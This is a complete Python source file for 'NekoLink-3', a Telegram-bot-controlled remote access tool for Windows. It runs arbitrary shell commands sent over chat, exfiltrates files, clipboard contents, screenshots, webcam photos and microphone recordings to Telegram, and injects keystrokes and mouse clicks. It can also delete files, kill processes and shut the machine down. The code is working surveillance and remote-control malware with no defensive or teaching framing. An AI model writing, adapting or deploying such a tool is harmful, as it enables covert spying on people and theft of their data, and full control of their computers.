import os
import sys
import json
import subprocess
import requests
import time
import platform
import psutil
import shutil
import zipfile
import pyperclip
import ctypes
from datetime import datetime
from PIL import ImageGrab
import sounddevice as sd
import soundfile as sf

# Load config
if getattr(sys, 'frozen', False):
    # Running as compiled .exe
    config_path = os.path.join(os.path.dirname(sys.executable), "config.json")
else:
    # Running as script
    config_path = os.path.join(os.path.dirname(__file__), "config.json")

with open(config_path, "r") as f:
    config = json.load(f)

BOT_TOKEN = config["bot_token"]
ALLOWED_USER_IDS = config["allowed_user_ids"]

# Helper functions
def get_updates(offset=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    params = {"timeout": 30, "offset": offset}
    try:
        response = requests.get(url, params=params, timeout=35)
        return response.json().get("result", [])
    except:
        return []

def send_message(chat_id, text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text[:4096]}
    try:
        requests.post(url, data=data, timeout=10)
    except:
        pass

def send_file(chat_id, file_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        with open(file_path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': chat_id}
            requests.post(url, files=files, data=data, timeout=30)
    except Exception as e:
        send_message(chat_id, f"Error: {str(e)}")

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
        return output[:4000] if output.strip() else "[No output]"
    except:
        return "[Command failed]"

def show_notification(title, message):
    try:
        from plyer import notification
        notification.notify(title=title, message=message, timeout=5)
    except:
        pass

def show_popup(title, message):
    try:
        ctypes.windll.user32.MessageBoxW(0, message, title, 0)
    except:
        pass

# Command handlers
def handle_list(chat_id, path="."):
    try:
        items = os.listdir(path)
        output = "\n".join(items[:50])
        send_message(chat_id, f"Files in {path}:\n{output}")
    except Exception as e:
        send_message(chat_id, f"Error: {str(e)}")

def handle_search(chat_id, filename):
    matches = []
    script_dir = os.path.dirname(os.path.abspath(__file__))
    for root, dirs, files in os.walk(script_dir):
        for file in files:
            if filename.lower() in file.lower():
                matches.append(os.path.join(root, file))
                if len(matches) >= 20:
                    break
        if len(matches) >= 20:
            break
    if matches:
        send_message(chat_id, "\n".join(matches))
    else:
        send_message(chat_id, "No matches found")

def handle_delete(chat_id, path):
    try:
        if os.path.isfile(path):
            os.remove(path)
            send_message(chat_id, f"Deleted: {path}")
        elif os.path.isdir(path):
            shutil.rmtree(path)
            send_message(chat_id, f"Deleted directory: {path}")
        else:
            send_message(chat_id, "Path not found")
    except Exception as e:
        send_message(chat_id, f"Error: {str(e)}")

def handle_move(chat_id, src, dst):
    try:
        shutil.move(src, dst)
        send_message(chat_id, f"Moved: {src} -> {dst}")
    except Exception as e:
        send_message(chat_id, f"Error: {str(e)}")

def handle_zip(chat_id, path):
    try:
        zip_path = f"{path}.zip"
        with zipfile.ZipFile(zip_path, 'w') as zf:
            if os.path.isfile(path):
                zf.write(path)
            else:
                for root, dirs, files in os.walk(path):
                    for file in files:
                        zf.write(os.path.join(root, file))
        send_file(chat_id, zip_path)
        os.remove(zip_path)
    except Exception as e:
        send_message(chat_id, f"Error: {str(e)}")

def handle_clipboard(chat_id):
    try:
        text = pyperclip.paste()
        send_message(chat_id, f"Clipboard:\n{text[:1000]}")
    except:
        send_message(chat_id, "Could not read clipboard")

def handle_setclip(chat_id, text):
    try:
        pyperclip.copy(text)
        send_message(chat_id, "Clipboard set")
    except:
        send_message(chat_id, "Failed to set clipboard")

def handle_notify(chat_id, message):
    show_notification("NekoLink3", message)
    send_message(chat_id, "Notification sent")

def handle_popup(chat_id, message):
    show_popup("NekoLink3 Alert", message)
    send_message(chat_id, "Popup sent")

def handle_screenshot(chat_id):
    try:
        img = ImageGrab.grab()
        img.save("screenshot.png")
        send_file(chat_id, "screenshot.png")
        os.remove("screenshot.png")
    except Exception as e:
        send_message(chat_id, f"Screenshot failed: {str(e)}")

def handle_cam(chat_id):
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cv2.imwrite("webcam.jpg", frame)
        cap.release()
        send_file(chat_id, "webcam.jpg")
        os.remove("webcam.jpg")
    except:
        send_message(chat_id, "Webcam failed (OpenCV not installed?)")

def handle_mic(chat_id, duration=5):
    try:
        fs = 44100
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=1)
        sd.wait()
        sf.write("audio.wav", recording, fs)
        send_file(chat_id, "audio.wav")
        os.remove("audio.wav")
    except:
        send_message(chat_id, "Audio recording failed")

def handle_focus(chat_id, window_title):
    try:
        import pygetwindow as gw
        windows = gw.getWindowsWithTitle(window_title)
        if windows:
            windows[0].activate()
            send_message(chat_id, f"Focused: {window_title}")
        else:
            send_message(chat_id, "Window not found")
    except:
        send_message(chat_id, "pygetwindow not installed")

def handle_minimize(chat_id, window_title):
    try:
        import pygetwindow as gw
        windows = gw.getWindowsWithTitle(window_title)
        if windows:
            windows[0].minimize()
            send_message(chat_id, f"Minimized: {window_title}")
        else:
            send_message(chat_id, "Window not found")
    except:
        send_message(chat_id, "Failed to minimize window")

def handle_lock(chat_id):
    ctypes.windll.user32.LockWorkStation()
    send_message(chat_id, "Workstation locked")

def handle_shutdown(chat_id):
    send_message(chat_id, "Shutting down in 10 seconds...")
    os.system("shutdown /s /t 10")

def handle_restart(chat_id):
    send_message(chat_id, "Restarting in 10 seconds...")
    os.system("shutdown /r /t 10")

def handle_sleep(chat_id):
    send_message(chat_id, "Sleeping...")
    os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")

def handle_type(chat_id, text):
    try:
        import keyboard
        keyboard.write(text)
        send_message(chat_id, f"Typed: {text[:50]}")
    except:
        send_message(chat_id, "keyboard module not installed")

def handle_key(chat_id, key):
    try:
        import keyboard
        keyboard.press_and_release(key)
        send_message(chat_id, f"Pressed: {key}")
    except:
        send_message(chat_id, "keyboard module not installed")

def handle_click(chat_id, x=None, y=None):
    try:
        import pyautogui
        if x and y:
            pyautogui.click(int(x), int(y))
            send_message(chat_id, f"Clicked at ({x}, {y})")
        else:
            pyautogui.click()
            send_message(chat_id, "Clicked at current mouse position")
    except:
        send_message(chat_id, "pyautogui not installed")

def handle_active(chat_id):
    try:
        import pygetwindow as gw
        active = gw.getActiveWindow()
        send_message(chat_id, f"Active window: {active.title if active else 'Unknown'}")
    except:
        send_message(chat_id, "pygetwindow not installed")

def handle_uptime(chat_id):
    try:
        import uptime
        seconds = uptime.uptime()
        days = seconds // 86400
        hours = (seconds % 86400) // 3600
        minutes = (seconds % 3600) // 60
        send_message(chat_id, f"Uptime: {days}d {hours}h {minutes}m")
    except:
        send_message(chat_id, "uptime module not installed")

def handle_wallpaper(chat_id, path):
    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(path), 0)
        send_message(chat_id, f"Wallpaper changed to: {path}")
    except:
        send_message(chat_id, "Failed to change wallpaper")

# Main
def main():
    print("NekoLink-3 Running...")
    last_update_id = 0
    
    while True:
        try:
            updates = get_updates(last_update_id + 1)
            for update in updates:
                last_update_id = update.get("update_id", last_update_id)
                message = update.get("message")
                if not message:
                    continue
                
                chat_id = message["chat"]["id"]
                user_id = message["from"]["id"]
                
                if user_id not in ALLOWED_USER_IDS:
                    send_message(chat_id, "Unauthorized")
                    continue
                
                text = message.get("text", "")
                if not text:
                    continue
                
                parts = text.split()
                cmd = parts[0].lower()
                
                if cmd == "/start":
                    send_message(chat_id, "NekoLink-3 Active\nCommands: /list, /search, /delete, /move, /zip, /clipboard, /setclip, /notify, /popup, /screenshot, /cam, /mic, /focus, /minimize, /lock, /shutdown, /restart, /sleep, /type, /key, /click, /active, /uptime, /wallpaper, /info, /ps, /kill, /cd, /exec")
                
                elif cmd == "/list":
                    path = " ".join(parts[1:]) if len(parts) > 1 else "."
                    handle_list(chat_id, path)
                elif cmd == "/search" and len(parts) > 1:
                    handle_search(chat_id, " ".join(parts[1:]))
                elif cmd == "/delete" and len(parts) > 1:
                    handle_delete(chat_id, " ".join(parts[1:]))
                elif cmd == "/move" and len(parts) > 2:
                    handle_move(chat_id, parts[1], parts[2])
                elif cmd == "/zip" and len(parts) > 1:
                    handle_zip(chat_id, " ".join(parts[1:]))
                elif cmd == "/clipboard":
                    handle_clipboard(chat_id)
                elif cmd == "/setclip" and len(parts) > 1:
                    handle_setclip(chat_id, " ".join(parts[1:]))
                elif cmd == "/notify" and len(parts) > 1:
                    handle_notify(chat_id, " ".join(parts[1:]))
                elif cmd == "/popup" and len(parts) > 1:
                    handle_popup(chat_id, " ".join(parts[1:]))
                elif cmd == "/screenshot":
                    handle_screenshot(chat_id)
                elif cmd == "/cam":
                    handle_cam(chat_id)
                elif cmd == "/mic":
                    duration = int(parts[1]) if len(parts) > 1 else 5
                    handle_mic(chat_id, duration)
                elif cmd == "/focus" and len(parts) > 1:
                    handle_focus(chat_id, " ".join(parts[1:]))
                elif cmd == "/minimize" and len(parts) > 1:
                    handle_minimize(chat_id, " ".join(parts[1:]))
                elif cmd == "/lock":
                    handle_lock(chat_id)
                elif cmd == "/shutdown":
                    handle_shutdown(chat_id)
                elif cmd == "/restart":
                    handle_restart(chat_id)
                elif cmd == "/sleep":
                    handle_sleep(chat_id)
                elif cmd == "/type" and len(parts) > 1:
                    handle_type(chat_id, " ".join(parts[1:]))
                elif cmd == "/key" and len(parts) > 1:
                    handle_key(chat_id, parts[1])
                elif cmd == "/click":
                    if len(parts) > 2:
                        handle_click(chat_id, parts[1], parts[2])
                    else:
                        handle_click(chat_id)
                elif cmd == "/active":
                    handle_active(chat_id)
                elif cmd == "/uptime":
                    handle_uptime(chat_id)
                elif cmd == "/wallpaper" and len(parts) > 1:
                    handle_wallpaper(chat_id, " ".join(parts[1:]))
                elif cmd == "/info":
                    info = f"Hostname: {platform.node()}\nOS: {platform.system()} {platform.release()}\nCPU: {psutil.cpu_count()} cores\nRAM: {psutil.virtual_memory().total // (1024**3)} GB"
                    send_message(chat_id, info)
                elif cmd == "/ps":
                    procs = []
                    for p in psutil.process_iter(['pid', 'name']):
                        try:
                            procs.append(f"{p.info['pid']}: {p.info['name']}")
                        except:
                            continue
                    send_message(chat_id, "\n".join(procs[:50]))
                elif cmd == "/kill" and len(parts) > 1:
                    try:
                        p = psutil.Process(int(parts[1]))
                        p.terminate()
                        send_message(chat_id, f"Killed PID {parts[1]}")
                    except Exception as e:
                        send_message(chat_id, f"Failed: {str(e)}")
                elif cmd == "/cd" and len(parts) > 1:
                    try:
                        os.chdir(" ".join(parts[1:]))
                        send_message(chat_id, f"Now in: {os.getcwd()}")
                    except Exception as e:
                        send_message(chat_id, f"Failed: {str(e)}")
                elif cmd == "/exec" and len(parts) > 1:
                    output = execute_command(" ".join(parts[1:]))
                    send_message(chat_id, output)
                else:
                    send_message(chat_id, "Unknown command. Try /start")
        
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    # Test dependencies on first run
    try:
        import keyboard, pyautogui, pyperclip, pygetwindow, cv2, sounddevice, soundfile, PIL, plyer, uptime
    except ImportError:
        print("Installing dependencies...")
        subprocess.run([sys.executable, "-m", "pip", "install", "requests", "psutil", "keyboard", "pyautogui", "pyperclip", "pygetwindow", "opencv-python", "sounddevice", "soundfile", "Pillow", "plyer", "uptime"], capture_output=True)
    
    main()
